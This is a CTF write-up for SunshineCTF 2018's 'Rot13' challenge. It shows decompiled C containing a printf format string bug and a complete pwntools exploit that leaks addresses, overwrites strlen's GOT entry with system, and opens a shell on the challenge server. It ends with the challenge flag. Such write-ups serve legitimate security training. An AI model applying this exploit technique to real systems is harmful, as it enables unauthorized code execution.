# Reference

[//]: <> (文章所涉及到的技术点、WriteUp的链接)

* https://devcraft.io/2018/04/08/sunshine-ctf-2018.html#rot13
* https://ctftime.org/writeup/9549
* https://github.com/phieulang1993/ctf-writeups/blob/master/2018/sunshinectf/rot13/rot13.py
# Title

[//]: <> (题目)

Rot13 200 An inventor claims to have designed a machine that enciphers messages in a way that's impossible to break. He's holding a demo of this machine soon and is planning to allow people to try it out. See if you can find a way to ruin his demonstration!

nc chal1.sunshinectf.org 20006

Author: hackucf_kcolley

Files: rot13 rot13-libc.so libpwnableharness32.so

# Content

[//]: <> (WriteUp内容)

A pretty simple binary that just reads some text and then prints the rot13 of it:
```c
char v1; // [esp+3h] [ebp-415h]
size_t i; // [esp+4h] [ebp-414h]
size_t v3; // [esp+8h] [ebp-410h]
char s[1024]; // [esp+Ch] [ebp-40Ch]
unsigned int v5; // [esp+40Ch] [ebp-Ch]

v5 = __readgsdword(0x14u);
puts("Welcome to Hackersoft Rot13 Encrypter Home and Student Edition 2018.");
puts("  \"Because rot13 is the best encryption (tm)\" ~Eve");
puts((const char *)&unk_BCB);
puts("Note: Hackersoft Rot13 Encrypter Home and Student Edition can only");
puts("encrypt data. In order to decrypt rot13-encrypted data, you must");
puts("purchase Hackersoft Rot13 Decrypter Professional 2018.");
do
{
  puts("\nEnter some text to be rot13 encrypted:");
  if ( !fgets(s, 1024, stdin) )
    break;
  v3 = strlen(s);
  for ( i = 0; i < v3; ++i )
  {
    v1 = s[i];
    if ( (*__ctype_b_loc())[v1] & 0x200 )
    {
      v1 = (v1 - 84) % 26 + 97;
    }
    else if ( (*__ctype_b_loc())[v1] & 0x100 )
    {
      v1 = (v1 - 52) % 26 + 65;
    }
    s[i] = v1;
  }
  printf("Rot13 encrypted data: ");
  printf(s);
}
while ( !feof(stdin) );
puts("Thank you for using Hackersoft Rot13 Encrypter Home and Student Edition 2018!");
```

The issue is that it prints the encoded text directly with ```printf(s)```; so we have a pretty basic format string vulnerability with the addition of having to rot13 our payload first:

```python
#!/usr/bin/env python2
from pwn import *
import string

rot13 = string.maketrans(
    "ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz",
    "NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")
def rot(s):
  return string.translate(s, rot13)

def get_data():
    p.recvuntil(" data: ")
    resp = p.recvuntil("\n\nEnter some text", drop=True)
    return resp

def send_payload(payload):
    log.info("payload = %s" % repr(payload))
    p.sendline(rot(payload))
    return get_data()

def exploit():
  p.sendlineafter("encrypted:", rot("%2$p"))
  leak1 = int(get_data()[2:],16)
  libc.address = leak1 -  0x25325
  log.info("libc: 0x{:x}".format(libc.address))

  p.sendlineafter("encrypted:", rot("%3$p"))
  leak = int(get_data()[2:],16)
  binary.address = leak - 0x95b
  log.info("binary: 0x{:x}".format(binary.address))

  format_string = FmtStr(execute_fmt=send_payload)
  format_string.write(binary.got["strlen"], libc.symbols["system"])
  format_string.execute_writes()

  p.sendline("/bin/sh")
  p.interactive()

if __name__ == "__main__":
  name = "./rot13"
  binary = ELF(name)

  libc_name = "./rot13-libc.so"
  libc = ELF(libc_name)

  if len(sys.argv) > 1:
    p = remote("chal1.sunshinectf.org", 20006)
  else:
    p = process(name, env={'LD_PRELOAD': libc_name})
```

Flag: sun{q0hoy3_e0g13_1f_o3gg3e_gu4a_gu3_3a1tz4_z4pu1a3}